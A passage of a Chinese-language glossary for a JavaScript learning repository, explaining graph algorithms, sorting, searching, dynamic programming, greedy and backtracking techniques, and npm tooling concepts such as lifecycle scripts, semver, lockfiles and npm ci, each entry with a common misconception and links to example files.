**常见误解**：把权重当作「边走一次要花的钱」以外的含义随意解释。权重是算法真正读取的数据，符号取反（求最长路）会让 Dijkstra 直接失效。

也见 [Shortest Path（最短路径）](#shortest-path最短路径)、[Topological Sort（拓扑排序）](#topological-sort拓扑排序)。

示例：[`38_algorithms_and_data_structures/07_graph_traversal.js`](38_algorithms_and_data_structures/07_graph_traversal.js)

### Adjacency List and Matrix（邻接表与邻接矩阵）

两种图的存储方式。**邻接表**给每个顶点存一份「邻居名单」（`Map<V, V[]>`），空间 O(V + E)，遍历某点的邻居代价与该点的度成正比——稀疏图（边远少于 V²）的标准选择，也是真实项目里几乎总是正确的选择。**邻接矩阵**是 V×V 的二维表，`m[i][j]` 表示 i 到 j 有没有边（或边权），空间 O(V²)，但「判断两点是否相邻」和「改边权」都是 O(1)。选型只看两个数字：图的稠密程度，以及你最高频的操作是「遍历邻居」还是「查两点是否相连」。

**常见误解**：以为矩阵「更专业」。一万个顶点的图，矩阵要一亿个格子（几百 MB），而邻接表可能只有几万条边——绝大多数业务图都是稀疏的。

也见 [Graph（图）](#graph图)、[Depth-First Search（深度优先搜索）](#depth-first-search深度优先搜索)。

示例：[`38_algorithms_and_data_structures/07_graph_traversal.js`](38_algorithms_and_data_structures/07_graph_traversal.js)

### Depth-First Search（深度优先搜索）

深度优先搜索（DFS，Depth-First Search）的策略是「一条路走到黑，走不通再回头」——沿着一条边尽可能深入，直到无路可走才回退试别的分支。实现有两种：**递归**（借用函数调用栈，代码最短）和**显式栈**（避免深图爆栈，也能中途暂停）。访问标记 `visited` 是必须的，否则有环的图会无限递归。DFS 擅长：连通性判断、环检测、路径存在性、拓扑排序（后序反转）、求解迷宫、以及「枚举所有方案」。复杂度 O(V + E)。

**常见误解**：以为 DFS 能找到最短路径。**不能**——DFS 找到的是「某一条」路径，第一次到达终点时走的未必是最短的。最短路径要用 [BFS（广度优先搜索）](#breadth-first-search广度优先搜索)。

也见 [Backtracking（回溯）](#backtracking回溯)、[Breadth-First Search（广度优先搜索）](#breadth-first-search广度优先搜索)。

示例：[`38_algorithms_and_data_structures/07_graph_traversal.js`](38_algorithms_and_data_structures/07_graph_traversal.js)

### Breadth-First Search（广度优先搜索）

广度优先搜索（BFS，Breadth-First Search）的策略是「一圈一圈往外扩」：先访问所有距离为 1 的点，再访问距离为 2 的点。实现必须用**队列**——出队一个点，把它的未访问邻居全部入队。这个「按距离分层」的性质带来 BFS 最重要的用途：**在无权图（或边权全相等）中，BFS 首次到达某点时走过的边数就是最短距离**。它同样适用于树（层序遍历）、网格（最短路步数）、状态空间（最少操作次数）。复杂度 O(V + E)。

**常见误解**：把 BFS 用在带权图上求最短路。一旦边权不相等，「层数」就不再等于「代价」，必须换成 Dijkstra。

也见 [Depth-First Search（深度优先搜索）](#depth-first-search深度优先搜索)、[Shortest Path（最短路径）](#shortest-path最短路径)。

示例：[`38_algorithms_and_data_structures/07_graph_traversal.js`](38_algorithms_and_data_structures/07_graph_traversal.js)

### Directed Acyclic Graph（有向无环图）

有向无环图（DAG，Directed Acyclic Graph）是有方向且**不存在环**的图。它是「依赖关系」的数学原型：任务 A 必须在 B 之前完成、模块 A 依赖模块 B、课程 A 是课程 B 的先修。DAG 的特殊之处在于存在合法的处理顺序（拓扑序），因此可以做动态规划（按拓扑序递推）、可以并行调度（同层任务可同时跑）。**判环**是使用 DAG 时的第一步：如果存在环，说明依赖相互循环，任何「先做哪个」的方案都不成立。

**常见误解**：以为「没有环」是天然成立的。包管理、构建系统、微服务调用里出现循环依赖是常态，工具必须显式检测并报错。

也见 [Topological Sort（拓扑排序）](#topological-sort拓扑排序)、[Directed and Undirected Graph（有向图与无向图）](#directed-and-undirected-graph有向图与无向图)。

示例：[`38_algorithms_and_data_structures/07_graph_traversal.js`](38_algorithms_and_data_structures/07_graph_traversal.js)

### Topological Sort（拓扑排序）

拓扑排序把 DAG 的所有顶点排成一个线性序列，使得**每条边 u→v 中 u 都排在 v 前面**。两种实现：**Kahn 算法**（不断取出入度为 0 的顶点、输出、并把它的邻居入度减 1、新产生的 0 入度顶点入队）和 **DFS 后序反转**（DFS 时记录完成顺序，最后反转）。Kahn 算法还有个副作用：如果最后输出的顶点数少于总顶点数，说明图里有环。典型用途：构建顺序（webpack 的模块顺序）、任务调度、课程表、电子表格的公式重算顺序。复杂度 O(V + E)。

**常见误解**：以为拓扑序唯一。绝大多数 DAG 有多个合法拓扑序（只要有互不相关的分支），算法给出哪一个取决于遍历顺序。

也见 [Directed Acyclic Graph（有向无环图）](#directed-acyclic-graph有向无环图)、[Weight and Degree（权重与度）](#weight-and-degree权重与度)。

示例：[`38_algorithms_and_data_structures/07_graph_traversal.js`](38_algorithms_and_data_structures/07_graph_traversal.js)

### Shortest Path（最短路径）

最短路径问题是「从起点到终点，走哪条路代价最小」。在**无权图**（或所有边权相等）里，答案是 BFS：因为 BFS 按距离分层扩展，第一次访问到终点时的层数就是最短距离，不需要任何额外的松弛操作。在**带权图**里，BFS 失效，需要 Dijkstra（贪心地每次取出当前最近的未确定点，要求边权非负）或 Bellman-Ford（可处理负权，代价是 O(VE)）。

**常见误解**：以为「最短」一定指边数最少。当边有权重时，「边数少」和「代价小」是两回事——转机两次可能比转机一次更便宜。

也见 [Breadth-First Search（广度优先搜索）](#breadth-first-search广度优先搜索)、[Weight and Degree（权重与度）](#weight-and-degree权重与度)。

示例：[`38_algorithms_and_data_structures/07_graph_traversal.js`](38_algorithms_and_data_structures/07_graph_traversal.js)

### Sorting Algorithm（排序算法）

排序算法分两个家族。**O(n²) 家族**（冒泡、选择、插入）都靠「两两比较 + 交换」，思想简单但只适合小数据；其中插入排序在**接近有序**的数据上表现极好（几乎 O(n)），所以常被用作大算法在小数组上的收尾。**O(n log n) 家族**都靠**分治**：归并排序稳定、代价是需要 O(n) 辅助空间；快速排序原地、平均最快、但最坏会退化而且不稳定。工程结论：直接调 `Array.prototype.sort`（引擎内部是 TimSort 或快排+插入的混合），只有在需要特定性质（稳定/原地/外部排序）时才手写。

**常见误解**：以为快排「总是最快的」。对已排序或大量重复的数据，朴素的取首元素作 pivot 会退化成 O(n²)——这就是很多实现要随机化 pivot 或用三路分区的原因。

也见 [Divide and Conquer（分治）](#divide-and-conquer分治)、[Sorting Stability（排序稳定性）](#sorting-stability排序稳定性)、[In-place Sort（原地排序）](#in-place-sort原地排序)。

示例：[`38_algorithms_and_data_structures/08_sorting_algorithms.js`](38_algorithms_and_data_structures/08_sorting_algorithms.js)

### Divide and Conquer（分治）

分治把问题拆成若干个**规模更小的同型子问题**，分别求解后合并结果，三步走：分解（divide）、解决（conquer）、合并（combine）。当子问题缩小到「足够小」时用朴素方法直接处理（递归基）。它的复杂度满足 T(n) = aT(n/b) + f(n)，主定理告诉我们：当子问题数 a 和缩小比例 b 搭配得当（如 a=b=2，即每次对半分并处理两部分），结果就是 O(n log n)。归并排序和快速排序都是分治，差别只在「分解的代价」还是「合并的代价」占主导。

**常见误解**：以为「递归就是分治」。分治要求子问题**不相交**——斐波那契那种子问题互相重叠的递归是动态规划的地盘，不是分治。

也见 [Sorting Algorithm（排序算法）](#sorting-algorithm排序算法)、[Dynamic Programming（动态规划）](#dynamic-programming动态规划)。

示例：[`38_algorithms_and_data_structures/08_sorting_algorithms.js`](38_algorithms_and_data_structures/08_sorting_algorithms.js)

### Partition and Pivot（分区与基准）

这是快速排序的核心步骤。**pivot（基准）**是从当前范围里挑出来的一个「参照值」，**partition（分区）**把数组重排成「小于等于 pivot 的在左、大于 pivot 的在右」，并返回 pivot 的最终位置。经典实现用**双指针**（左右各一个，相向而行、交换逆序对）或**Lomuto 方案**（单指针把小的往前推）。分区完成后，pivot 已经在它最终该在的位置上，再对左右两段递归即可。所以快排的性能几乎完全由「pivot 选得好不好」决定。

**常见误解**：以为分区会「排序」。分区后左右两段内部仍然是乱序的，只保证「左段全部 ≤ pivot ≤ 右段全部」。

也见 [Sorting Algorithm（排序算法）](#sorting-algorithm排序算法)、[Two Pointers（双指针）](#two-pointers双指针)。

示例：[`38_algorithms_and_data_structures/08_sorting_algorithms.js`](38_algorithms_and_data_structures/08_sorting_algorithms.js)

### Sorting Stability（排序稳定性）

如果两个元素的**排序键相等**，排序后它们的相对顺序与排序前一致，这个排序算法就是**稳定的**。为什么这很重要？因为它支持「多轮排序」：先按姓名排、再按年龄排，只要第二次排序是稳定的，同年龄的人内部就保持着姓名的次序——这是分页、报表、多级排序的常见需求。稳定性对照表：冒泡、插入、归并**稳定**；选择、快速、堆排序**不稳定**（堆排序因为要远距离交换元素）。ES `Array.prototype.sort` 从 ES2019 起**规定必须稳定**。

**常见误解**：以为「稳定」是一种性能指标。稳定与快慢无关，它是**语义保证**。另一个误解是靠比较对象引用而不是键来判断，导致结论错误。

也见 [Sorting Algorithm（排序算法）](#sorting-algorithm排序算法)、[In-place Sort（原地排序）](#in-place-sort原地排序)。

示例：[`38_algorithms_and_data_structures/08_sorting_algorithms.js`](38_algorithms_and_data_structures/08_sorting_algorithms.js)

### In-place Sort（原地排序）

原地排序指只需要 **O(1)（或 O(log n)）额外空间**就能完成的排序，它直接在输入数组上交换元素，不申请一个等长的辅助数组。堆排序和快速排序是原地排序，冒泡/选择/插入也是；**归并排序不是**（它的 merge 步骤需要 O(n) 的辅助数组）。原地的价值在处理大数据时体现：给一亿条记录排序，多要一份 O(n) 内存可能就是几 GB。代价是原地算法通常需要更多次「远距离交换」，对缓存不友好，实际跑起来未必比归并快。

**常见误解**：以为「原地」等于「不消耗内存」。递归本身要占调用栈，快排的栈深度平均是 O(log n)、最坏 O(n)。

也见 [Space Complexity（空间复杂度）](#space-complexity空间复杂度)、[Sorting Stability（排序稳定性）](#sorting-stability排序稳定性)。

示例：[`38_algorithms_and_data_structures/08_sorting_algorithms.js`](38_algorithms_and_data_structures/08_sorting_algorithms.js)

### Binary Search（二分查找）

二分查找在**已排序**的数组里每次把搜索范围砍一半：取中点比较，小了就往右半边找，大了就往左半边找，直到命中或范围为空。复杂度 O(log n)，威力极其可观——十亿条数据最多 30 次比较。边界条件是它真正的难点：`while (lo <= hi)` 还是 `lo < hi`？中点用 `Math.floor((lo + hi) / 2)` 还是 `lo + Math.floor((hi - lo) / 2)`？返回 `lo` 还是 `-1`？建议固定一套模板（找目标是否存在用闭区间 `lo <= hi`；找插入位置用左闭右开 `lo < hi`），并想清楚「循环不变式」，而不是靠试。

**常见误解**：`(lo + hi) / 2` 在别的语言里会整数溢出；JS 里没有这个问题，但用 `lo + (hi - lo) / 2` 依然是更稳妥的习惯。另一个误解是「数组差不多有序也可以用二分」——不行，二分对数据的有序性是硬要求。

也见 [Binary Search on Answer（二分答案）](#binary-search-on-answer二分答案)、[Asymptotic Analysis（渐进分析）](#asymptotic-analysis渐进分析)。

示例：[`38_algorithms_and_data_structures/09_searching_algorithms.js`](38_algorithms_and_data_structures/09_searching_algorithms.js)

### Binary Search on Answer（二分答案）

二分答案是一种「不直接搜索数组，而是搜索**答案的取值空间**」的技巧：当问题的答案具有**单调性**（如果 x 可行，那么所有比 x 更宽松/更大的值也可行，反之亦然）时，就可以对答案本身做二分，每次用 O(n) 的代价「验证这个答案行不行」，总复杂度 O(n log C)。典型题：把货物分成 k 份使最大份最小、安排 k 天内完成的最少容量、分割数组的最大值最小。它是把「优化问题」转化成「判定问题」的经典手段。

**常见误解**：以为二分答案需要答案空间有序。不需要——需要的只是**判定函数的单调性**，取值空间本身可以是任意连续区间甚至离散集合。

也见 [Binary Search（二分查找）](#binary-search二分查找)、[Greedy Algorithm（贪心算法）](#greedy-algorithm贪心算法)。

示例：[`38_algorithms_and_data_structures/09_searching_algorithms.js`](38_algorithms_and_data_structures/09_searching_algorithms.js)

### Dynamic Programming（动态规划）

动态规划（DP）解决的是「大问题能拆成一堆**重叠的子问题**，且大问题的最优解可由子问题的最优解拼出来」这类问题。核心动作只有两个：把子问题的答案**记下来**（避免重复计算），再用子问题的答案**推出**大问题的答案（状态转移）。它适用与否看两个信号：**最优子结构**（整体最优由局部最优构成）和**重叠子问题**（朴素递归会反复算同一个子问题）。典型问题：斐波那契、背包、编辑距离、最长公共子序列、找零钱。

**常见误解**：以为「能递归就是 DP」。没有重叠子问题时（如归并排序），缓存毫无收益，那是分治不是 DP；而一旦子问题重叠，朴素递归可能从 O(n) 爆炸成 O(2ⁿ)。

也见 [Memoization（备忘录法）](#memoization备忘录法)、[Divide and Conquer（分治）](#divide-and-conquer分治)、[Greedy Algorithm（贪心算法）](#greedy-algorithm贪心算法)。

示例：[`38_algorithms_and_data_structures/10_dynamic_programming.js`](38_algorithms_and_data_structures/10_dynamic_programming.js)

### Optimal Substructure（最优子结构）

最优子结构指「一个问题的最优解，一定由它子问题的最优解组合而成」——这是 DP 能成立的前提。用反证法验证最方便：如果存在一个更好的子问题解能让整体更优，那说明原来的不是最优，矛盾。经典反例是「最长简单路径」：子路径的最长并不构成整体最长（子路径之间可能冲突），所以它没有最优子结构，不能用朴素 DP。要注意它和**贪心选择性质**的区别：最优子结构是 DP 的必要条件，而贪心还额外要求「局部最优选择不会让后续变差」。

**常见误解**：把最优子结构当作 DP 的充分条件。它只是前提之一，还需要重叠子问题，否则分治就够用了。

也见 [Dynamic Programming（动态规划）](#dynamic-programming动态规划)、[Overlapping Subproblems（重叠子问题）](#overlapping-subproblems重叠子问题)。

示例：[`38_algorithms_and_data_structures/10_dynamic_programming.js`](38_algorithms_and_data_structures/10_dynamic_programming.js)

### Overlapping Subproblems（重叠子问题）

重叠子问题指「递归展开后，同一个子问题被反复求解」。它是 DP 与分治的分水岭：归并排序的两半互不相干（不重叠，用分治）；斐波那契 `f(5)` 需要 `f(4)` 和 `f(3)`，而 `f(4)` 又需要 `f(3)`——`f(3)` 被算了两次，随 n 增大重复次数指数级爆炸。一旦确认重叠，加一个「缓存表」就能把指数复杂度压成多项式。

**常见误解**：以为「有重叠就必须用 DP」。如果子问题数量很小、重复次数很少，缓存带来的额外开销（哈希查找、内存）反而得不偿失。

也见 [Dynamic Programming（动态规划）](#dynamic-programming动态规划)、[Memoization（备忘录法）](#memoization备忘录法)。

示例：[`38_algorithms_and_data_structures/10_dynamic_programming.js`](38_algorithms_and_data_structures/10_dynamic_programming.js)

### State Transition Equation（状态转移方程）

状态转移方程是 DP 的「公式部分」：用已知子问题的答案表达当前问题的答案。写 DP 的顺序是固定的四步：① 定义**状态** `dp[i]` 的**含义**（这一步最关键，且必须是「无后效性」的——只依赖已算出的状态）；② 写出**转移方程**（如 `dp[i] = dp[i-1] + dp[i-2]`）；③ 确定**初始条件**（`dp[0]`、`dp[1]`）；④ 确定**遍历顺序**（保证计算 `dp[i]` 时它依赖的状态已经算好）。常见误解：跳过第 ① 步直接抄别人的方程——方程对了但状态含义理解错了，遇到变体就写不出来。

也见 [Top-down and Bottom-up（自顶向下与自底向上）](#top-down-and-bottom-up自顶向下与自底向上)、[Dynamic Programming（动态规划）](#dynamic-programming动态规划)。

示例：[`38_algorithms_and_data_structures/10_dynamic_programming.js`](38_algorithms_and_data_structures/10_dynamic_programming.js)

### Top-down and Bottom-up（自顶向下与自底向上）

DP 的两种实现方向。**自顶向下（top-down）**从原问题出发递归，遇到没算过的子问题才算并缓存（即记忆化搜索）——写起来就是「朴素递归 + 一行缓存」，最贴近状态转移方程，缺点是递归深度可能爆栈。**自底向上（bottom-up）**直接从最小的子问题开始循环填表，一路推到目标——没有递归开销，方便做「滚动数组」把空间从 O(n²) 压到 O(n)，缺点是需要自己想清楚遍历顺序。两者时间复杂度相同，工程上通常先写自顶向下验证正确性，再改自底向上做优化。

**常见误解**：以为「递推」和「递归」是 DP 的分类。真正的分类轴是「计算方向的起点」，而非实现语法。

也见 [Memoization（备忘录法）](#memoization备忘录法)、[State Transition Equation（状态转移方程）](#state-transition-equation状态转移方程)。

示例：[`38_algorithms_and_data_structures/10_dynamic_programming.js`](38_algorithms_and_data_structures/10_dynamic_programming.js)

### Memoization（备忘录法）

备忘录法（记忆化搜索）是自顶向下 DP 的实现手段：在递归函数入口查缓存，命中就返回，未命中就计算并把结果写进缓存再返回。JS 里可以用 `Map` 以参数拼成的字符串为键，也可以直接在数组上打标记。它把「指数级的重复计算」压缩成「每个子问题只算一次」。工程上它还有更广阔的应用：给纯函数加一层缓存（memoize 高阶函数）就是通用性能优化手段。

**常见误解**：把 memoize 用在**有副作用或非纯**的函数上。如果函数依赖外部可变状态或做了 IO，缓存返回的就是过期的错误结果——记忆化只对纯函数安全。

也见 [Top-down and Bottom-up（自顶向下与自底向上）](#top-down-and-bottom-up自顶向下与自底向上)、[Pure Function（纯函数）](#pure-function纯函数)。

示例：[`38_algorithms_and_data_structures/10_dynamic_programming.js`](38_algorithms_and_data_structures/10_dynamic_programming.js)、[`06_functions/11_pure_functions.js`](06_functions/11_pure_functions.js)

### Greedy Algorithm（贪心算法）

贪心算法在每一步都选「当下看起来最好的那个选项」，且**不回头**。它写起来通常只有几行，但**正确性需要证明**：只有当问题同时具备**贪心选择性质**（局部最优能推出全局最优）和**最优子结构**时才对。经典可用的例子：活动选择、找零（面额规范时）、Huffman 编码、单源最短路 Dijkstra。经典的失败例子：0-1 背包（贪心按性价比拿会漏掉更优组合，必须用 DP）、找零（面额 1/3/4 找 6，贪心给 4+1+1 共三枚，最优是 3+3 两枚）。

**常见误解**：以为「看起来对」就是对的。贪心是**最需要验证**的算法族——判断标准很简单：能不能构造一个反例。

也见 [Dynamic Programming（动态规划）](#dynamic-programming动态规划)、[Binary Search on Answer（二分答案）](#binary-search-on-answer二分答案)。

示例：[`38_algorithms_and_data_structures/10_dynamic_programming.js`](38_algorithms_and_data_structures/10_dynamic_programming.js)

### Backtracking（回溯）

回溯是「系统地枚举所有可能解」的框架：做选择 → 递归进入下一层 → **撤销选择**（这就是「回溯」二字的含义）→ 试下一个选择。它是深度优先搜索在「解空间树」上的应用，模板几乎固定：`if (满足结束条件) 收集结果; for (每个候选) { 做选择; backtrack(); 撤销选择; }`。适用于组合、排列、子集、N 皇后、数独、单词搜索、以及图里的路径枚举。剪枝（提前排除不可能的分支）是它能否跑完的关键。

**常见误解**：忘了「撤销选择」这一句，导致后续分支带着被污染的状态运行——这是回溯最常见的 bug。另外要注意「收集结果时是否需要深拷贝」，直接把结果数组 push 进去会因为后续修改而全部变成同一份。

也见 [Depth-First Search（深度优先搜索）](#depth-first-search深度优先搜索)、[Dynamic Programming（动态规划）](#dynamic-programming动态规划)。

示例：[`38_algorithms_and_data_structures/10_dynamic_programming.js`](38_algorithms_and_data_structures/10_dynamic_programming.js)、[`38_algorithms_and_data_structures/07_graph_traversal.js`](38_algorithms_and_data_structures/07_graph_traversal.js)

### Two Pointers（双指针）

双指针指「同时维护两个下标，用它们的相对运动来替代嵌套循环」，从而把 O(n²) 降到 O(n)。常见形态有三类：**相向双指针**（左右夹逼，用于有序数组的两数之和、反转、分区）；**同向双指针 / 快慢指针**（用于原地去重、找链表中点、判环）；以及**滑动窗口**（两个指针构成的窗口）。能用的前提通常是数据有序，或者问题具有「移动某个指针不会漏解」的单调性质。

**常见误解**：以为双指针是某个具体算法。它是一类**技巧模板**，识别信号是「有序数组 + 找一对/一段 + 暴力是双重循环」。

也见 [Sliding Window（滑动窗口）](#sliding-window滑动窗口)、[Partition and Pivot（分区与基准）](#partition-and-pivot分区与基准)。

示例：[`38_algorithms_and_data_structures/08_sorting_algorithms.js`](38_algorithms_and_data_structures/08_sorting_algorithms.js)

### Sliding Window（滑动窗口）

滑动窗口是用两个指针维护一个**连续区间** `[left, right)`，通过扩大右边界纳入新元素、收缩左边界排除旧元素，在一次遍历内处理所有「连续子数组/子串」问题。它的前提是**窗口的某个指标具有单调性**（如「窗口内元素和」随右扩增大、随左缩减小），这样才能在窗口违反约束时安全地移动左指针，而不需要回头重算。典型应用：最长无重复字符子串、和 ≥ target 的最短子数组、限流（统计最近 1 秒内的请求数）、时间序列的移动平均。

**常见误解**：以为所有子数组问题都能用滑动窗口。如果数组中含**负数**，「窗口和」不再单调，窗口就不能安全收缩——此时要么改用前缀和 + 哈希表，要么用 DP。

也见 [Two Pointers（双指针）](#two-pointers双指针)、[Deque（双端队列）](#deque双端队列)。

示例：[`38_algorithms_and_data_structures/03_stack_and_queue.js`](38_algorithms_and_data_structures/03_stack_and_queue.js)

## 工程化工具链

### package.json（package.json 清单文件）

`package.json` 是 Node.js 项目根目录下的 JSON 文件，同时承担三件事：描述包**是什么**（`name`/`version`/`description`/`license`）、描述包**怎么用**（`type`/`main`/`exports`/`files`）、描述**依赖谁、怎么跑**（`dependencies`/`scripts`/`engines`）。npm、pnpm、yarn 和 Node.js 本身都会读它。关键细节：它是**严格 JSON**——不能写注释、不能有尾随逗号、不能用单引号，这是初学者最常见的报错来源。

**常见误解**：以为 `package.json` 是给 npm 用的配置文件。它其实是**包的公开契约**：别人 `npm install` 你的包时，决定他们看到什么、怎么引入的，就是这些字段。

也见 [Package Entry Fields（包的入口与暴露字段）](#package-entry-fields包的入口与暴露字段)、[Semantic Versioning（语义化版本）](#semantic-versioning语义化版本)。

示例：[`39_tooling_and_workflow/01_package_json_guide.js`](39_tooling_and_workflow/01_package_json_guide.js)

### Package Entry Fields（包的入口与暴露字段）

一组决定「包怎么被消费」的字段。`main`：CommonJS 的入口文件，老工具的兜底。`module`：打包器（非 Node）使用的 ESM 入口，属于社区约定而非规范。`exports`：现代、权威的**条件导出表**，可以按 `import`/`require`/`node`/`browser` 等条件分别指定入口，同时**把未列出的路径彻底封死**（子路径封装）。`files`：发布时只打包哪些文件/目录的白名单，直接影响产物体积（`node_modules`、`src` 默认不进包）。`engines`：声明支持的 Node 版本，npm 默认只警告不阻止，除非开启 `engine-strict`。

**常见误解**：以为加了 `exports` 就万事大吉。`exports` 一旦存在，`main` 对现代 Node 就失去意义，且**深路径导入**（`pkg/lib/x.js`）会立刻失效——这是发布新版本时最常见的破坏性变更。

也见 [package.json（package.json 清单文件）](#packagejsonpackagejson-清单文件)、[Semantic Versioning（语义化版本）](#semantic-versioning语义化版本)。

示例：[`39_tooling_and_workflow/01_package_json_guide.js`](39_tooling_and_workflow/01_package_json_guide.js)

### npm scripts（npm 脚本）

`scripts` 字段是一张「命令名 → shell 命令」的映射表。执行 `npm run <名字>` 时，npm 会：把命令交给系统 shell；在 `PATH` 最前面插入本项目及各级父目录的 `node_modules/.bin`；注入一批 `npm_` 开头的环境变量；并按 `pre<名字>` → `<名字>` → `post<名字>` 的顺序执行。所以 scripts 不是新语法，它只是**带 PATH 注入和钩子的 shell 命令别名**——这正是为什么 `npm run lint` 里可以直接写 `eslint` 而不必写完整路径。

**常见误解**：以为 scripts 是跨平台保证。它本质是 shell 命令，`rm -rf`、`&&` 在 Windows 的 cmd 下行为不同，跨平台请用 `rimraf`、`cross-env` 这类工具。

也见 [Lifecycle Scripts（生命周期脚本）](#lifecycle-scripts生命周期脚本)、[lint-staged（lint-staged）](#lint-stagedlint-staged)。

示例：[`39_tooling_and_workflow/02_npm_scripts_and_lifecycle.js`](39_tooling_and_workflow/02_npm_scripts_and_lifecycle.js)

### Lifecycle Scripts（生命周期脚本）

生命周期脚本是 npm 在特定时刻**自动**触发的 scripts，分为两类。一是**任意脚本的 `pre`/`post` 钩子**：定义 `prebuild` 和 `postbuild` 后，`npm run build` 会自动按序执行三者。二是**包的固定生命周期**：`prepare`（`npm install` 本地安装和 `npm publish` 前都跑，常用于构建产物）、`prepublishOnly`（只在发布前跑，用于跑测试）、`prepack`/`postpack`、`preinstall`/`postinstall`（安装前后）。注意 `prepublish` 已废弃，不要再用。

**常见误解**：以为 `postinstall` 是「安装后运行我的初始化脚本」的安全位置。它确实会跑，但依赖的 `postinstall` 在别人机器上也会执行任意代码，这既是供应链攻击的常见入口，也让 CI 变慢——所以很多团队用 `--ignore-scripts` 禁掉它。

也见 [npm scripts（npm 脚本）](#npm-scriptsnpm-脚本)、[Release Process（发布流程）](#release-process发布流程)。

示例：[`39_tooling_and_workflow/02_npm_scripts_and_lifecycle.js`](39_tooling_and_workflow/02_npm_scripts_and_lifecycle.js)

### Semantic Versioning（语义化版本）

语义化版本（Semantic Versioning，semver）规定版本号写成 `MAJOR.MINOR.PATCH`，并给每一段赋予**约定俗成的含义**：MAJOR 是破坏性变更（breaking change），MINOR 是向后兼容的新功能，PATCH 是向后兼容的 bug 修复。它的价值在于让「版本号」变成一种**契约**：消费方看到 MINOR 升级就敢直接升，看到 MAJOR 升级就知道要读迁移文档。`0.x.y` 是特例——按规范它表示「初始开发阶段，任何版本都可能破坏兼容」。

**常见误解**：以为版本号是自动递增的。semver 描述的是**你对使用者做出的承诺**，涨哪一位是维护者的人工判断，工具（如 changesets）只是帮你记账。

也见 [MAJOR-MINOR-PATCH（主次修订号）](#major-minor-patch主次修订号)、[Version Range（版本范围）](#version-range版本范围)。

示例：[`39_tooling_and_workflow/03_semver.js`](39_tooling_and_workflow/03_semver.js)

### MAJOR-MINOR-PATCH（主次修订号）

三段版本号各自的含义与判断标准：**MAJOR**（主版本）——任何会让现有代码跑不起来的改动：删掉导出的函数、改函数签名、改默认值语义、把 `main` 换成 `exports` 并封死深路径；**MINOR**（次版本）——新增能力，老代码完全不受影响：加一个新导出、加一个可选参数；**PATCH**（修订号）——不改变任何公开行为的修复：修 bug、改文档、性能优化。判断口诀：**对使用者的代码有没有影响？没有就是 PATCH，只有增加就是 MINOR，有删除或改变就是 MAJOR。**

**常见误解**：把「我自己改了内部实现」当成 MINOR。只要使用者观察不到行为变化，就该是 PATCH；反过来，即使只改了一行，只要破坏了别人依赖的行为，就必须是 MAJOR。

也见 [Semantic Versioning（语义化版本）](#semantic-versioning语义化版本)、[Version Range（版本范围）](#version-range版本范围)。

示例：[`39_tooling_and_workflow/03_semver.js`](39_tooling_and_workflow/03_semver.js)

### Version Range（版本范围）

版本范围是写在 `package.json` 里、告诉包管理器「我能接受哪些版本」的表达式。常用写法：`^1.2.3`（兼容范围，允许 ≥1.2.3 且 <2.0.0，最常用）、`~1.2.3`（只允许补丁级，≥1.2.3 且 <1.3.0）、`1.2.x`、`>=1.2.3 <2.0.0`（显式区间）、`*` 或 `latest`（任意版本，生产环境应避免）。关键认识：范围是**声明意图**，不是**确定结果**——`^1.2.3` 意味着「下次安装可能装到 1.9.0」，具体装到哪个由锁文件决定。

**常见误解**：以为 `^` 表示「固定在这个版本附近」。它允许相当大的浮动（整个 MAJOR 内），依赖方在 MINOR 里不小心引入破坏性变更时，你就会莫名其妙地挂掉——这正是锁文件存在的理由。

也见 [Lockfile（锁文件）](#lockfile锁文件)、[Semantic Versioning（语义化版本）](#semantic-versioning语义化版本)。

示例：[`39_tooling_and_workflow/03_semver.js`](39_tooling_and_workflow/03_semver.js)

### Lockfile（锁文件）

锁文件（`package-lock.json` / `pnpm-lock.yaml` / `yarn.lock`）是包管理器在安装后自动生成的**依赖树快照**，逐条记录每个包的精确版本、下载地址（resolved）、内容哈希（integrity）以及它是不是开发依赖。它补齐了 `package.json` 只写「范围」而无法确定「具体版本」的缺口，从而让安装结果**可复现**：任何时间、任何机器、任何人，装出来的树完全一致。锁文件**必须提交到版本库**，否则等于白写。

**常见误解**：以为锁文件是「本地缓存文件」所以应该 gitignore。正相反——它是团队一致性的基石；把它忽略掉会让每个人装出不同的依赖树，CI 也就失去了意义。

也见 [npm ci（npm ci）](#npm-cinpm-ci)、[Reproducible Build（可复现构建）](#reproducible-build可复现构建)。

示例：[`39_tooling_and_workflow/07_lockfile_and_ci.js`](39_tooling_and_workflow/07_lockfile_and_ci.js)

### npm ci（npm ci）

`npm ci` 是专为自动化环境（CI、Docker 构建）设计的安装命令。它与 `npm install` 的四个关键差别：① 严格按锁文件安装，**完全忽略** `package.json` 里的范围，装出的版本与锁文件逐字节一致；② 如果锁文件缺失或与 `package.json` 不同步，直接**报错退出**而不是悄悄修复；③ 安装前会先删除 `node_modules`，保证是干净环境；④ 因为它知道要装什么，不做依赖求解，速度显著更快。结论：**开发时用 `npm install`，CI 和部署用 `npm ci`。**

**常见误解**：以为 `npm ci` 只是「更快的 install」。它真正的价值是**失败得响亮**——你改了 `package.json` 却忘了更新锁文件时，CI 会立刻告诉你，而不是让你的构建悄悄跑在一个不存在于任何地方的依赖组合上。

也见 [Lockfile（锁文件）](#lockfile锁文件)、[Continuous Integration（持续集成）](#continuous-integration持续集成)。

示例：[`39_tooling_and_workflow/07_lockfile_and_ci.js`](39_tooling_and_workflow/07_lockfile_and_ci.js)

### Reproducible Build（可复现构建）

可复现构建指「同样的源码 + 同样的锁文件，在任何机器上得到**逐字节相同**的产物」。它是三件事共同保证的：锁文件钉死依赖版本、`npm ci` 保证安装过程确定、构建工具关闭时间戳/随机数/绝对路径等不确定性来源。为什么值得追求？因为它让「本机跑得好，线上就崩」这类问题变成可排查的：产物可对比、构建可缓存、缓存命中就真的安全。它是供应链安全的基石——产物可复现，才能验证发布的二进制确实来自公开的源码。

**常见误解**：以为「锁了依赖版本」就等于可复现。转译器版本、Node 版本、环境变量、文件系统遍历顺序（`readdir` 返回顺序）都会影响输出，必须一并钉死。

也见 [Lockfile（锁文件）](#lockfile锁文件)、[Build Artifact（构建产物）](#build-artifact构建产物)。

示例：[`39_tooling_and_workflow/07_lockfile_and_ci.js`](39_tooling_and_workflow/07_lockfile_and_ci.js)、[`39_tooling_and_workflow/08_code_quality_workflow.js`](39_tooling_and_workflow/08_code_quality_workflow.js)

### Linter（代码检查器）

